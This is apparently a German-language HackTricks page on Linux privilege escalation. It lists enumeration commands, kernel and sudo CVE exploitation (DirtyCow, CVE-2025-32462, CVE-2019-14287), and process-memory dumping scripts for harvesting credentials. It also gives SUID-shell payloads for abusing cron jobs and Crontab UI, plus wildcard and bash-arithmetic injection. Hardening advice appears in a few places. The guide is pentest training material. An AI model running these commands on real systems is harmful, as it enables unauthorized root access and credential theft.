# Linux-Privilegieneskalation

{{#include ../../../banners/hacktricks-training.md}}

Für einen umfassenderen Hintergrund und historische Enumerations-Workflows vergleiche die in den Referenzen aufgeführten Ressourcen von g0tmi1k, Payatu, SANS, LPE Workshop, Linux-Privilege-Escalation und linux-private-i.<sup>[[5]](#references)[[6]](#references)[[7]](#references)[[10]](#references)[[11]](#references)[[13]](#references)</sup>

## Systeminformationen

### Betriebssysteminformationen

Beginnen wir damit, Informationen über das laufende Betriebssystem zu sammeln.

```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```

### Path

Wenn du **Schreibrechte für einen Ordner innerhalb der `PATH`-Variable hast, kannst du möglicherweise einige Bibliotheken oder Binärdateien hijacken:

```bash
echo $PATH
```

### Umgebungsinformationen

Interessante Informationen, Passwörter oder API-Schlüssel in den Umgebungsvariablen?

```bash
(env || set) 2>/dev/null
```

### Kernel-Exploits

Prüfe die Kernelversion und ob es einen Exploit gibt, mit dem sich die Rechte ausweiten lassen.

Im [Kernel/LPE/CVE-Abschnitt](../../main-system-information/kernel-lpe-cves/README.md) werden lokale Rechteausweitungen gesammelt und Links zu ausführlicheren Linux-Kernel-Beiträgen im Bereich Binary Exploitation bereitgestellt. Überprüfe den betroffenen Build und die Konfiguration, bevor du einen Fall testest.

```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```

Eine gute Liste verwundbarer Kernel und einige bereits **kompilierte Exploits** findest du hier: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) und [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).<sup>[[12]](#references)</sup>\
Weitere Websites, auf denen du **kompilierte Exploits** findest: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Um alle verwundbaren Kernelversionen von dieser Website abzurufen, kannst du Folgendes ausführen:

```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```

Tools, die bei der Suche nach Kernel-Exploits helfen können:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (AUF DEM OPFER AUSFÜHREN, prüft nur Exploits für Kernel 2.x)

**Suche immer die Kernel-Version bei Google**. Vielleicht steht deine Kernel-Version in einem Kernel-Exploit, dann kannst du sicher sein, dass dieser Exploit funktioniert.

Zusätzliche Kernel-Exploitation-Techniken:

{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8

```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```

### Sudo-Version

Basierend auf den verwundbaren Sudo-Versionen, die in folgendem Dokument aufgeführt sind:

```bash
searchsploit sudo
```

Mit diesem grep kannst du prüfen, ob die sudo-Version verwundbar ist.

```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```

### Sudo < 1.9.17p1

Upstream sudo **1.9.14 bis 1.9.17** ermöglicht es unprivilegierten lokalen Benutzern, über die Option `--chroot` Root-Rechte zu erlangen, wenn sudo `/etc/nsswitch.conf` aus einem benutzergesteuerten Verzeichnis lädt; upstream wurde dies in **1.9.17p1** behoben. Überprüfen Sie alle ausführbaren Sudo-Binärdateien mit Root-Setuid in den relevanten Pfaden, da `sudo -V` nur die über `PATH` ausgewählte Binärdatei meldet. Distributionspakete können den Fix zurückportieren, ohne die Versionszeichenfolge von upstream zu ändern. Überprüfen Sie daher auch den Status des Pakets des Anbieters. Siehe den [Hinweis des sudo-Maintainers](https://www.openwall.com/lists/oss-security/2025/06/30/3).<sup>[[28]](#references)[[29]](#references)</sup>

Hier ist ein [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot), um diese [Schwachstelle](https://nvd.nist.gov/vuln/detail/CVE-2025-32463) auszunutzen. Stellen Sie vor dem Ausführen des Exploits sicher, dass Ihre `sudo`-Version verwundbar ist und die Funktion `chroot` unterstützt.  

Weitere Informationen finden Sie im ursprünglichen [Hinweis zur Schwachstelle](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/).<sup>[[28]](#references)</sup>

### Umgehung hostbasierter Sudo-Regeln (CVE-2025-32462)

Upstream sudo **1.8.8 bis 1.9.17** kann hostbasierte sudoers-Regeln anhand des **vom Benutzer angegebenen Hostnamens** aus `sudo -h <host>` statt anhand des **tatsächlichen Hostnamens** auswerten; upstream wurde dies in **1.9.17p1** behoben. Der Benutzer muss weiterhin auf dem ausgewählten Host einen passenden sudoers-Eintrag haben. Überprüfen Sie neben der lokalen Richtlinie auch zurückportierte Fixes des Anbieters und alternative Sudo-Binärdateien. Siehe den [Hinweis des sudo-Maintainers](https://www.openwall.com/lists/oss-security/2025/06/30/2).<sup>[[29]](#references)</sup>

Voraussetzungen:
- Verwundbare sudo-Version
- Host-spezifische sudoers-Regeln (der Host ist weder der aktuelle Hostname noch `ALL`)

Beispiel für ein sudoers-Muster:

```
Host_Alias     SERVERS = devbox, prodbox
Host_Alias     PROD    = prodbox
alice          SERVERS, !PROD = NOPASSWD:ALL
```

Exploit durch Spoofing des zugelassenen Hosts:

```bash
sudo -h devbox id
sudo -h devbox -i
```

Wenn die Auflösung des ausgewählten Namens blockiert, überprüfe, wie dieser Name auf dem Host aufgelöst wird. Dass ein Name in einem Log oder einer Konfigurationsdatei auftaucht, bedeutet nicht, dass er aufgelöst werden kann. Änderungen an `/etc/hosts` erfordern normalerweise privilegierte Schreibrechte.

#### sudo < v1.8.28

Dieser [upstream Runas UID bypass](https://ubuntu.com/security/CVE-2019-14287) setzt eine tatsächlich wirksame sudo-Regel voraus, die einen Befehl als beliebige Benutzer erlaubt und root ausschließt, etwa `(ALL, !root) /bin/bash`. Der Aufrufer muss diese Regel ebenfalls verwenden dürfen; dazu können auch Authentifizierungsanforderungen gehören. Prüfe die Sicherheitshinweise zum installierten Paket: Anbieter haben den Fix in Versionen zurückportiert, deren angezeigte upstream-Version weiterhin unter 1.8.28 liegt. Eine `!root`-Regel oder eine alte Version allein bestätigt keine Anfälligkeit. Führe bei einer passiven Enumeration keine privilegierten Befehle aus.

```
sudo -u#-1 /bin/bash
```

### Dmesg-Signaturüberprüfung fehlgeschlagen

Sieh dir die **smasher2-Box von HTB** an, um ein **Beispiel** dafür zu sehen, wie diese Schwachstelle ausgenutzt werden könnte.

```bash
dmesg 2>/dev/null | grep "signature"
```

### Weitere Systemaufzählung

```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```

## Mögliche Schutzmaßnahmen ermitteln

### AppArmor

```bash
if [ `which aa-status 2>/dev/null` ]; then
    aa-status
  elif [ `which apparmor_status 2>/dev/null` ]; then
    apparmor_status
  elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
    ls -d /etc/apparmor*
  else
    echo "Not found AppArmor"
fi
```

### Grsecurity

```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```

### PaX

```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```

### Execshield

```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```

### SElinux

```bash
 (sestatus 2>/dev/null || echo "Not found sestatus")
```

### ASLR

```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```

## Container Breakout

Wenn du dich in einem Container befindest, beginne mit dem folgenden Abschnitt zur Containersicherheit und wechsle anschließend zu den Abuse-Seiten für die jeweilige Runtime:

{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Laufwerke

Prüfe, **was wo und warum eingehängt oder ausgehängt ist**. Wenn etwas ausgehängt ist, könntest du versuchen, es einzuhängen und nach privaten Informationen zu suchen.

```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```

## Nützliche Software

Nützliche Binärdateien auflisten

```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```

Prüfe außerdem, ob **irgendein Compiler installiert ist**. Das ist nützlich, wenn du einen Kernel-Exploit verwenden musst, da es empfehlenswert ist, ihn auf dem Rechner zu kompilieren, auf dem du ihn einsetzen willst (oder auf einem ähnlichen).

```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```

### Installierte verwundbare Software

Prüfe die **Versionen der installierten Pakete und Dienste**. Vielleicht gibt es eine alte Nagios-Version (zum Beispiel), die zur Privilegienausweitung ausgenutzt werden könnte…\
Es wird empfohlen, die Version verdächtiger installierter Software manuell zu überprüfen.

```bash
dpkg -l #Debian
rpm -qa #Centos
```

Wenn du SSH-Zugriff auf die Maschine hast, könntest du auch **openVAS** verwenden, um nach veralteter und anfälliger Software zu suchen, die auf der Maschine installiert ist.

> [!NOTE] > _Beachte, dass diese Befehle viele Informationen anzeigen, die größtenteils nutzlos sein werden. Daher empfiehlt es sich, Anwendungen wie OpenVAS oder ähnliche zu verwenden, die prüfen, ob eine installierte Softwareversion durch bekannte Exploits verwundbar ist._

## Prozesse

Sieh dir an, **welche Prozesse** ausgeführt werden, und prüfe, ob ein Prozess **mehr Berechtigungen hat als nötig** (vielleicht wird ein Tomcat als root ausgeführt?).

```bash
ps aux
ps -ef
top -n 1
```

Prüfe immer, ob [**electron/cef/chromium debuggers** ausgeführt werden; du könntest sie missbrauchen, um deine Privilegien zu erhöhen](../../software-information/electron-cef-chromium-debugger-abuse.md). **Linpeas** erkennt sie, indem es den Parameter `--inspect` in der Befehlszeile des Prozesses prüft.\
Prüfe außerdem **deine Berechtigungen für die Binärdateien der Prozesse** – vielleicht kannst du eine davon überschreiben.

### Eltern-Kind-Ketten zwischen Benutzern

Ein Child-Prozess, der unter einem **anderen Benutzer** als sein Parent ausgeführt wird, ist nicht automatisch bösartig, aber ein nützliches **Triage-Signal**. Manche Übergänge sind erwartungsgemäß (`root` startet einen Service-Benutzer, Login-Manager erstellen Sitzungsprozesse), aber ungewöhnliche Ketten können Wrapper, Debug-Helfer, Persistenz oder schwache Vertrauensgrenzen zur Laufzeit aufdecken.

Kurze Überprüfung:

```bash
ps -eo pid,ppid,user,comm,args --sort=ppid
pstree -alp
```

Wenn du eine überraschende Kette findest, untersuche die Befehlszeile des übergeordneten Prozesses und alle Dateien, die sein Verhalten beeinflussen (`config`, `EnvironmentFile`, Hilfsskripte, Arbeitsverzeichnis, beschreibbare Argumente). Bei mehreren realen privesc-Pfaden war das Kind selbst nicht beschreibbar, wohl aber die **vom übergeordneten Prozess kontrollierte config** oder die Hilfsskript-Kette.

### Gelöschte ausführbare Dateien und gelöschte, geöffnete Dateien

Laufzeitartefakte sind oft auch **nach dem Löschen** noch zugänglich. Das ist sowohl für die Rechteausweitung nützlich als auch zum Wiederherstellen von Beweismaterial aus einem Prozess, der bereits sensible Dateien geöffnet hat.

Suche nach gelöschten ausführbaren Dateien:

```bash
pid=<PID>
ls -l /proc/$pid/exe
readlink /proc/$pid/exe
tr '\0' ' ' </proc/$pid/cmdline; echo
```

Wenn `/proc/<PID>/exe` auf `(deleted)` verweist, führt der Prozess weiterhin das alte Binärabbild aus dem Speicher aus. Das ist ein starkes Signal für weitere Untersuchungen, denn:

- die entfernte ausführbare Datei kann interessante Strings oder Zugangsdaten enthalten
- der laufende Prozess kann weiterhin nützliche Dateideskriptoren offenhalten
- eine gelöschte privilegierte Binärdatei kann auf kürzlich erfolgte Manipulationen oder einen Bereinigungsversuch hindeuten

Alle gelöschten, global geöffneten Dateien erfassen:

```bash
lsof +L1
```

Wenn du einen interessanten Deskriptor findest, rufe ihn direkt ab:

```bash
ls -l /proc/<PID>/fd
cat /proc/<PID>/fd/<FD>
```

Das ist besonders wertvoll, wenn ein Prozess noch eine gelöschte geheime Datei, ein Skript, einen Datenbankexport oder eine Flag-Datei geöffnet hat.

### Prozessüberwachung

Du kannst Tools wie [**pspy**](https://github.com/DominicBreuker/pspy) verwenden, um Prozesse zu überwachen. Das kann sehr nützlich sein, um anfällige Prozesse zu identifizieren, die häufig ausgeführt werden oder wenn bestimmte Voraussetzungen erfüllt sind.

#### Linux ProcMon mit sudo

[ProcMon for Linux](https://github.com/microsoft/ProcMon-for-Linux) kann ausgewählte Prozesse und Systemaufrufe nachverfolgen und einen SQLite-Trace speichern. Wenn `sudo -l` einen uneingeschränkten, root-fähigen `procmon`-Befehl erlaubt, solltest du prüfen, ob damit die Ein- oder Ausgaben des Prozesses eines anderen Benutzers überwacht werden könnten. Diese Berechtigung ist lediglich ein Ansatzpunkt für die Prüfung: Die Unterstützung durch den Tracer, die geltenden Richtlinien und die Aktivität eines geeigneten Prozesses spielen ebenfalls eine Rolle. Trace-Dateien können Geheimnisse enthalten. Prüfe daher autorisierte Exporte sorgfältig und vermeide es, nicht zugehörige Prozesse zu erfassen.

### Prozessspeicher

Manche Dienste auf einem Server speichern **Anmeldedaten im Klartext im Speicher**.\
Normalerweise benötigst du **root-Rechte**, um den Speicher von Prozessen zu lesen, die anderen Benutzern gehören. Daher ist dies in der Regel nützlicher, wenn du bereits root bist und weitere Anmeldedaten finden möchtest.\
Beachte jedoch, dass **du als normaler Benutzer den Speicher der Prozesse lesen kannst, die dir gehören**.

> [!WARNING]
> Beachte, dass die meisten Rechner heutzutage **ptrace standardmäßig nicht erlauben**. Das bedeutet, dass du keine anderen Prozesse dumpen kannst, die deinem unprivilegierten Benutzer gehören.
>
> Die Datei _**/proc/sys/kernel/yama/ptrace_scope**_ steuert den Zugriff auf ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: Alle Prozesse können debuggt werden, solange sie dieselbe UID haben. So funktionierte ptracing früher üblicherweise.
> - **kernel.yama.ptrace_scope = 1**: Nur ein Elternprozess kann debuggt werden.
> - **kernel.yama.ptrace_scope = 2**: Nur Administratoren können ptrace verwenden, da dafür die Fähigkeit CAP_SYS_PTRACE erforderlich ist.
> - **kernel.yama.ptrace_scope = 3**: Kein Prozess darf mit ptrace nachverfolgt werden. Nach dem Setzen ist ein Neustart erforderlich, um ptracing wieder zu aktivieren.

Ein Prozess mit derselben UID, der kurzzeitig einen Passwort-Tresor entsperrt, kann eine separate Grenze zum Schutz von Anmeldedaten darstellen. Wenn Tracing erlaubt ist, kann ein aktiver, dumpbarer Prozess das Tresorpasswort über seine Eingabe-Systemaufrufe oder seinen Speicher preisgeben, obwohl die verschlüsselte Tresordatei selbst geschützt bleibt. `ptrace_scope=0` ist nur eine von mehreren Voraussetzungen: Übereinstimmende Zugangsdaten, die Dumpbarkeit des Ziels, weitere Linux-Sicherheitsmodule und die Lebensdauer des Prozesses spielen ebenfalls eine Rolle. Ob sich ein Tresoreintrag für eine Unix-root-Anmeldung wiederverwenden lässt, muss separat geprüft werden. Bei einer routinemäßigen Aufzählung sollten die Richtlinie und mögliche Prozesse oder Tresorpfade gemeldet werden, nicht jedoch Eingaben erfasst oder Geheimnisse ausgegeben werden. Siehe die [Yama-Dokumentation des Kernels](https://cdn.kernel.org/doc/html/latest/admin-guide/LSM/Yama.html) und die [ptrace-Zugriffsprüfungen](https://man7.org/linux/man-pages/man2/ptrace.2.html).

#### GDB

Wenn du beispielsweise Zugriff auf den Speicher eines FTP-Dienstes hast, könntest du den Heap auslesen und darin nach seinen Anmeldedaten suchen.

```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```

#### GDB-Skript

```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
    | sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
    | while read start stop; do \
    gdb --batch --pid $1 -ex \
    "dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```

#### /proc/$pid/maps & /proc/$pid/mem

Für eine gegebene Prozess-ID zeigen **maps an, wie der Speicher innerhalb des virtuellen Adressraums des Prozesses zugeordnet ist**; außerdem werden die **Berechtigungen der einzelnen zugeordneten Bereiche** angezeigt. Die Pseudodatei **mem legt den Speicher des Prozesses selbst offen**. Aus der Datei **maps** wissen wir, welche **Speicherbereiche lesbar sind** und welche Offsets sie haben. Anhand dieser Informationen springen wir in der mem-Datei zu den entsprechenden Stellen und schreiben alle lesbaren Bereiche in eine Datei.

```bash
procdump()
(
    cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
    while read a b; do
        dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
           skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
    done )
    cat $1*.bin > $1.dump
    rm $1*.bin
)
```

#### /dev/mem

`/dev/mem` ermöglicht den Zugriff auf den **physischen** Speicher des Systems, nicht auf den virtuellen Speicher. Auf den virtuellen Adressraum des Kernels kann über /dev/kmem zugegriffen werden.\
Typischerweise ist `/dev/mem` nur für **root** und die Gruppe **kmem** lesbar.

```
strings /dev/mem -n10 | grep -i PASS
```

### ProcDump für Linux

ProcDump ist eine Linux-Neuinterpretation des klassischen ProcDump-Tools aus der Sysinternals-Toolsuite für Windows. Du findest es unter [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)

```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```

### Tools

Um den Speicher eines Prozesses auszulesen, kannst du Folgendes verwenden:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Du kannst die root-Anforderungen manuell entfernen und den Prozess auslesen, der dir gehört
- Script A.5 aus [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root ist erforderlich)

### Zugangsdaten aus dem Prozessspeicher

#### Manuelles Beispiel

Wenn du feststellst, dass der Authentifizierungsprozess läuft:

```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```

Sie können den Prozess dumpen (siehe vorherige Abschnitte, um verschiedene Möglichkeiten zum Dumpen des Speichers eines Prozesses zu finden) und im Speicher nach Zugangsdaten suchen:

```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```

#### mimipenguin

Das Tool [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) wird **Klartext-Zugangsdaten aus dem Arbeitsspeicher** und aus einigen **bekannten Dateien stehlen**. Für die ordnungsgemäße Funktion sind Root-Rechte erforderlich.

| Funktion                                          | Prozessname          |
| ------------------------------------------------- | -------------------- |
| GDM-Passwort (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (aktive FTP-Verbindungen)                  | vsftpd               |
| Apache2 (aktive HTTP-Basic-Auth-Sitzungen)        | apache2              |
| OpenSSH (aktive SSH-Sitzungen – sudo-Nutzung)     | sshd:                |

#### Such-Regexe/[truffleproc](https://github.com/controlplaneio/truffleproc)

```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```

## Geplante/Cron-Jobs

### Crontab UI (alseambusher) läuft als root – webbasierte Scheduler-privesc

Wenn ein Web-Panel „Crontab UI“ (alseambusher/crontab-ui) als root läuft und nur an loopback gebunden ist, kannst du es trotzdem per SSH-Local-Port-Forwarding erreichen und einen privilegierten Job erstellen, um deine Rechte zu erweitern.<sup>[[1]](#references)[[4]](#references)</sup>

Typischer Ablauf
- Einen nur an loopback gebundenen Port finden (z. B. 127.0.0.1:8000) und den Basic-Auth-Realm über `ss -ntlp` / `curl -v localhost:8000` ermitteln
- Zugangsdaten in betrieblichen Artefakten finden:
  - Backups/Skripte mit `zip -P <password>`
  - systemd-Unit, die `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."` offenlegt
- Tunnel einrichten und anmelden:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Einen privilegierten Job erstellen und sofort ausführen (legt eine SUID-Shell ab):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Verwenden Sie es:
```bash
/tmp/rootshell -p   # root shell
```

Hardening
- Crontab UI nicht als root ausführen; einen dedizierten Benutzer mit minimalen Berechtigungen verwenden
- An localhost binden und den Zugriff zusätzlich per Firewall/VPN einschränken; Passwörter nicht wiederverwenden
- Keine Secrets in Unit-Dateien einbetten; Secret Stores oder eine nur für root zugängliche EnvironmentFile verwenden
- Audit/Logging für die Ausführung von Jobs auf Abruf aktivieren

Prüfen, ob ein geplanter Job verwundbar ist. Vielleicht kannst du ein Skript ausnutzen, das als root ausgeführt wird (wildcard vuln? Dateien ändern, die root verwendet? symlinks verwenden? bestimmte Dateien im Verzeichnis anlegen, das root verwendet?).

```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```

Wenn `run-parts` verwendet wird, prüfen Sie, welche Namen tatsächlich ausgeführt werden:

```bash
run-parts --test /etc/cron.hourly
run-parts --test /etc/cron.daily
```

Dies vermeidet falsch positive Ergebnisse. Ein beschreibbares periodisches Verzeichnis ist nur dann nützlich, wenn der Name deiner Payload-Datei den lokalen `run-parts`-Regeln entspricht.

### Cron-Pfad

Zum Beispiel findest du in _/etc/crontab_ den PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Beachte, dass der Benutzer „user“ Schreibrechte für /home/user hat._)

Wenn der root-Benutzer in dieser Crontab versucht, einen Befehl oder ein Skript auszuführen, ohne den Pfad anzugeben. Zum Beispiel: _\* \* \* \* root overwrite.sh_\
Dann kannst du eine root-Shell erhalten, indem du Folgendes verwendest:

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```

### Cron mit einem Skript, das einen Wildcard verwendet (Wildcard Injection)

Wenn ein von root ausgeführtes Skript in einem Befehl ein „**\***“ enthält, könntest du das ausnutzen, um unerwartete Dinge zu bewirken (wie etwa privesc). Beispiel:

```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```

**Wenn dem Wildcard ein Pfad wie** _**/some/path/\***_ **vorangestellt ist, ist es nicht verwundbar (selbst** _**./\***_ **ist es nicht).**

Auf der folgenden Seite findest du weitere Tricks zur Ausnutzung von Wildcards:


{{#ref}}
../../interesting-files-permissions/wildcards-spare-tricks.md
{{#endref}}


### Bash-Arithmetik-Expansion-Injection in Cron-Log-Parsern

Bash-Arithmetik kann nicht vertrauenswürdigen Text als Ausdruck interpretieren. In betroffenen Bash-Kontexten kann ein Array-Index innerhalb dieses Ausdrucks eine command substitution auswerten. Wenn ein privilegierter Cron-Parser vom Angreifer kontrollierten Log-Text in einen solchen arithmetischen Vergleich einsetzt, kann die Substitution mit der Identität des Parsers ausgeführt werden.<sup>[[22]](#references)</sup> Das hängt vom genauen Bash-Ausdruck und der Version ab; eine einfache Zeichenfolge `$(...)0` in einer expandierten Variable ist für sich genommen kein verlässlicher Nachweis dafür, dass sie erneut ausgewertet wird.

Die Eingabe kann auch aus Dateimetadaten oder einem anderen Feld stammen, das aus einem benutzerschreibbaren Speicherort gelesen wird. Beispielsweise führt ein privilegiertes Bereinigungsskript, das ein `Producer`-Tag eines Bildes ausliest und es mit `[[ "$producer" -eq "expected" ]]` vergleicht, einen arithmetischen Vergleich durch, obwohl die Variable in Anführungszeichen steht. Ermittle die geplante Identität, welche Dateien das Tag liefern können, alle Transformationen vor dem Vergleich und das genaue Bash-Verhalten. Verwende für Textbezeichnungen einen Zeichenfolgenvergleich; validiere für Zahlen die Eingabe vor der Arithmetik als Dezimalziffern. Siehe die [Bash-Arithmetikregeln](https://www.gnu.org/software/bash/manual/html_node/Shell-Arithmetic.html).

- Typisches verwundbares Muster:
  ```bash
  #!/bin/bash
  # Example: parse a log and "sum" a count field coming from the log
  while IFS=',' read -r ts user count rest; do
      # count is untrusted if the log is attacker-controlled
      (( total += count ))     # or: let "n=$count"
  done < /var/www/app/log/application.log
  ```

- Sichere lokale Verhaltensprüfung des Array-Subscript-Mechanismus (kein privilegierter Prozess und keine Dateiänderung):
  ```bash
  code='x[$(printf marker >&2)]'
  [[ 200 -eq "$code" ]]
  # Bash may print "marker" while evaluating the arithmetic operand.
  ```

Untersuche das tatsächlich geplante Skript und den wörtlichen Eingabepfad, den es öffnet. Selbst wenn die Logdatei selbst nicht beschreibbar ist, kann ein Benutzer, der in ihr nicht mit Sticky Bit geschütztes übergeordnetes Verzeichnis schreiben und es durchlaufen kann, möglicherweise ihren Verzeichniseintrag ersetzen; mit `namei -l` lassen sich diese Berechtigungen unterscheiden. Ein anderer beschreibbarer Logpfad, ein nicht lesbarer Scheduler oder ein Parser, der dieses Feld nie als Bash-Arithmetik auswertet, belegt diesen Angriffsweg nicht.

### Überschreiben von Cron-Skripten und Symlinks

Wenn du **ein von root ausgeführtes Cron-Skript ändern kannst**, kannst du sehr einfach eine Shell erhalten:

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```

Wenn das von root ausgeführte Skript ein Verzeichnis verwendet, auf das du uneingeschränkten Zugriff hast, könnte es nützlich sein, dieses Verzeichnis zu löschen und einen Symlink auf ein anderes Verzeichnis anzulegen, in dem ein von dir kontrolliertes Skript liegt.

```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```

### Symlink-Validierung und sichererer Umgang mit Dateien

Prüfe bei der Überprüfung privilegierter Skripte/Binaries, die Dateien über Pfade lesen oder schreiben, wie Links behandelt werden:

- `stat()` folgt einem Symlink und gibt die Metadaten des Ziels zurück.
- `lstat()` gibt die Metadaten des Links selbst zurück.
- `readlink -f` und `namei -l` helfen dabei, das endgültige Ziel aufzulösen und die Berechtigungen jeder Pfadkomponente anzuzeigen.

```bash
readlink -f /path/to/link
namei -l /path/to/link
```

Für Verteidiger/Entwickler gehören zu sichereren Vorgehensweisen gegen Symlink-Tricks:

- `O_EXCL` mit `O_CREAT`: schlägt fehl, wenn der Pfad bereits existiert (verhindert vorbereitete Links/Dateien des Angreifers).
- `openat()`: arbeitet relativ zu einem vertrauenswürdigen Verzeichnis-Dateideskriptor.
- `mkstemp()`: erstellt temporäre Dateien atomar mit sicheren Berechtigungen.

### Benutzerdefiniert signierte Cron-Binaries mit beschreibbaren Payloads
